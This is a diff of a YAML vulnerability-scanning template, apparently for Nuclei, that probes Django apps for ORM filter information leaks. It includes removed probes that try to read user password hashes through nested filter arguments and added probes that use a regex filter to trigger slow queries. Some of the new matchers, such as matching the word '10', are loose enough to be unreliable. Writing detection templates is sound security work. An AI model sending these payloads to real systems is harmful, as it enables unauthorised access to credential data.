@@ -1,22 +1,32 @@
-id: django-orm-leak
+id: django-orm-leak-enhanced
 
 info:
-  name: Django ORM Information Leak
-  author: ProjectDiscoveryAI
+  name: Django ORM Information Leak (Enhanced)
+  author: s1d6p01nt7
   severity: high
   description: |
-    This template checks for information leaks in Django applications due to improper handling of ORM queries. By passing unrestricted keyword arguments to the Django ORM filter method, it becomes possible to construct queries that access sensitive data.
+    This template checks for information leaks in Django applications due to improper handling of ORM queries. It includes checks for various data types and leakage methods.
 
 http:
-  - raw:
-      - |
-        POST /articles/filter/ HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/login/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Django administration"
+        part: body
 
-        {
-          "title__startswith": "admin"
-        }
+  - method: POST
+    path:
+      - "{{BaseURL}}/articles/filter/"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "id__gt": 10
+      }
     matchers-condition: and
     matchers:
       - type: status
@@ -24,17 +34,18 @@ http:
           - 200
       - type: word
         words:
-          - "admin"
+          - "10"
+        part: body
 
-  - raw:
-      - |
-        POST /articles/filter/ HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
-
-        {
-          "author__user__password__startswith": "pbkdf2_sha256"
-        }
+  - method: POST
+    path:
+      - "{{BaseURL}}/articles/filter/"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "title__startswith": "This is a test"
+      }
     matchers-condition: and
     matchers:
       - type: status
@@ -42,4 +53,23 @@ http:
           - 200
       - type: word
         words:
-          - "pbkdf2_sha256"
+          - "This is a test"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/articles/filter/"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "author__user__username__regex": "^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - "response_time > 10"
